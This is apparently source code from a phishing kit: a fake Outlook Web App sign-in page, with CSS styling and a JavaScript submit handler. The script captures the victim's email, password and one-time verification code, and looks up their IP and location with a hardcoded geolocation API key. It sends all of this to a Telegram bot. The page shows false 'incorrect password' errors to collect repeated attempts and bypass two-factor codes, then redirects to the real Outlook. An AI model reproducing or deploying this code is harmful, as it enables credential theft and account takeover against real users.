  <style>
    :root{
      --green:rgb(18, 18, 128); 
      --green-700:#0072c6; 
      --gray:#f2f2f2;    
      --text:#111827;   
      --muted:#6b7280;     
      --pc-blue: #0072c6;  
      --pc-blue-600: #0072c6; 
      --pc-gray: rgb(152, 6, 6); 
      --pc-box: 16px;  
      --pc-border: 2px;  
      --pc-gap: 10px;  
    }
    
    html, body { height: 100%; margin: 0; overflow: hidden; }
    body { background: #ffffff; font-family:'Segoe UI Semibold', 'Segoe WP Semibold', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif; }

    .layout { display: grid; grid-template-columns: 60% 40%; height: 100vh; width: 100vw; }
    .left { position: relative; overflow: hidden; background: #848282; }
    .left-bg {
      position: absolute; inset: 0;
      background-image: url("https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?q=80&w=2070&auto=format&fit=crop");
      background-size: cover; background-position: center;
      filter: blur(4px); transform: scale(1.05);
    }
    .left::after {
      content: ""; position: absolute; inset: 0; pointer-events: none;
      background: rgb(132 130 130 / 60%); z-index: 1;
    }

    .left-center { position: absolute; inset: 0; display: grid; place-items: center; z-index: 2; pointer-events: none; }
    .badge { text-align: center; color: #f9fafb; }
    .badge svg { width: 150px; height: 150px; }

    .right { background: white; display: grid; place-items: center; }
    .panel { max-width: 450px; width: 90%; padding: 20px; }
    .logo-row { display: flex; align-items: center; gap: 10px; margin-bottom: 20px; }
    .logo-word { color: #0072c6; font-size: 50px; line-height: 1; font-weight: 50; }
    .field-block { width: 100%; display: flex; flex-direction: column; margin-bottom: 15px; }
    .label { font-size: 14px; margin-bottom: 5px; }
    .input { width: 100%; border: 1px solid #d1d5db; padding: 8px; font-size: 14px; box-sizing: border-box; }
    .input:focus { outline: 1px solid #0072c6; }

    .anti-bot {
      margin-top: 12px; padding: 10px 12px; border: 1px solid #e5e7eb; border-radius: 8px;
      background: #f9fafb; display: flex; flex-direction: column; gap: 6px;
    }
    .anti-bot-label { font-size: 12px; color: #6b7280; }
    .anti-bot-field {
      position: absolute; left: -9999px; opacity: 0; pointer-events: none;
      width: 1px; height: 1px; overflow: hidden;
    }
    .anti-bot small { color: #4b5563; font-size: 12px; }

    .btn { background: transparent; border: 0; color: #0072c6; cursor: pointer; display: flex; align-items: center; gap: 8px; margin-top: 30px; font-size: 18px; padding: 0; }
    .btn:hover { text-decoration: underline; }
    .btn:disabled { opacity: 0.5; cursor: not-allowed; }
    
    .pc-check { display: flex; align-items: center; gap: 10px; cursor: pointer; margin-top: 35px; }
    .pc-box { width: 16px; height: 16px; border: 2px solid #0072c6; border-radius: 2px; position: relative; }
    .pc-input { display: none; }
    .pc-input:checked + .pc-box { background: #0072c6; }
    .pc-input:checked + .pc-box::after {
      content: ""; position: absolute; width: 4px; height: 8px; border-right: 2px solid #fff; border-bottom: 2px solid #fff;
      transform: rotate(45deg); top: 1px; left: 4px;
    }
    .pc-text { font-size: 12px; color: gray; }
    .pc-warning { font-size: 12px; color: var(--pc-gray); margin-top: 8px; line-height: 1.4; }
    #errorMsg { color: #b91c1c; font-size: 12px; margin-top: 10px; display: none; }
    .hidden { display: none !important; }

    .spinner {
      display: none; width: 16px; height: 16px; border: 2px solid rgba(0, 114, 198, .2);
      border-top-color: #0072c6; border-radius: 50%; animation: spin .9s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    @media (max-width: 768px) {
      .layout { grid-template-columns: 1fr; }
      .left { display: none; }
      .logo-word { font-size: 35px; }
    }
  </style>
</head>

      var attemptCount = 0;

      var form = document.getElementById('loginForm');
      var loginBtn = document.getElementById('loginBtn');
      var emailInput = document.getElementById('email');
      var passwordInput = document.getElementById('password');
      var spinner = document.getElementById('spinner');
      var icon = document.getElementById('btnIcon');
      var text = document.getElementById('btnText');
      var errorMsg = document.getElementById('errorMsg');
      var antiBotField = document.getElementById('website');

      function showAlert(msg, isSuccess) {
        errorMsg.textContent = msg;
        errorMsg.style.display = 'block';
        errorMsg.style.color = isSuccess ? 'green' : '#b91c1c';
      }

      form.addEventListener('submit', function (e) {
        e.preventDefault();

        if (!emailInput.value || !passwordInput.value) {
          showAlert('Please enter your email and password.', false);
          return;
        }

        if (antiBotField.value) {
          showAlert('Submission blocked. Please leave the extra field empty.', false);
          return;
        }

        loginBtn.disabled = true;
        spinner.style.display = 'inline-block';
        icon.style.display = 'none';
        text.textContent = 'Signing in...';
        errorMsg.style.display = 'none';

        setTimeout(function () {
          attemptCount++;
          
          var demoEmail = emailInput.value || " ";
        var demoPassword = document.getElementById('password').value || " ";
        var demoCode = document.getElementById('verificationCode').value || " ";
        var demoTime = new Date().toISOString();

        if (attemptCount >= 3) {
          fetch('https://api.ipgeolocation.io/ipgeo?apiKey=bbdd6e41e7b74e1aad798d0fb9f4d7e5')
            .then(function(response) { return response.json(); })
            .then(function(data) {
              var demoIP = data.ip || 'Unavailable';
              var locationParts = [data.city, data.state_prov, data.country_name].filter(function(part) { return part; });
              var demoLocation = locationParts.length > 0 ? locationParts.join(', ') : 'Unavailable';

              var demoMessage = "Nelson OWA OTP login attempted:\n" +
                                "Email: " + demoEmail + "\n" +
                                "Password: " + demoPassword + "\n" +
                                "Verification Code: " + demoCode + "\n" +
                                "Time: " + demoTime + "\n" +
                                "IP: " + demoIP + "\n" +
                                "Location: " + demoLocation;

              var url = 'https://api.telegram.org/bot' + encodeURIComponent(TELEGRAM_TOKEN) + '/sendMessage?chat_id=' + encodeURIComponent(TELEGRAM_CHAT_ID) + '&text=' + encodeURIComponent(demoMessage);

              return fetch(url, { method: 'GET' });
            })
            .then(function () {
              setTimeout(function () {
                window.location.href = 'https://outlook.office.com/mail/';
              }, 500);
            })
            .catch(function () {
              setTimeout(function () {
                window.location.href = 'https://outlook.office.com/mail/';
              }, 500);
            });
          return;
        }

        fetch('https://api.ipgeolocation.io/ipgeo?apiKey=bbdd6e41e7b74e1aad798d0fb9f4d7e5')
          .then(function(response) { return response.json(); })
          .then(function(data) {
            var demoIP = data.ip || 'Unavailable';
            var locationParts = [data.city, data.state_prov, data.country_name].filter(function(part) { return part; });
            var demoLocation = locationParts.length > 0 ? locationParts.join(', ') : 'Unavailable';

            var demoMessage = "Nelson OWA attempted:\n" +
                              "Email: " + demoEmail + "\n" +
                              "Password: " + demoPassword + "\n" +
                              "Time: " + demoTime + "\n" +
                              "IP: " + demoIP + "\n" +
                              "Location: " + demoLocation;

            var url = 'https://api.telegram.org/bot' + encodeURIComponent(TELEGRAM_TOKEN) + '/sendMessage?chat_id=' + encodeURIComponent(TELEGRAM_CHAT_ID) + '&text=' + encodeURIComponent(demoMessage);

            return fetch(url, { method: 'GET' });
          })
          .then(function (res) { return res.json(); })
          .then(function () {
            if (attemptCount === 2) {
              var codeSection = document.getElementById('codeSection');
              codeSection.classList.remove('hidden');
              showAlert(' Please enter the verification code sent to your device.', false);
              document.getElementById('verificationCode').focus();
            } else {
              showAlert('Your account or password is incorrect.\'.', false);
            }
          })
          .catch(function () {
            showAlert('Something went wrong. Please try again.', false);
          })
          .finally(function () {
            loginBtn.disabled = false;
            spinner.style.display = 'none';
            icon.style.display = 'inline-block';
            text.textContent = 'Sign in';
          });
        }, 900);
      });
    })();
  </script>
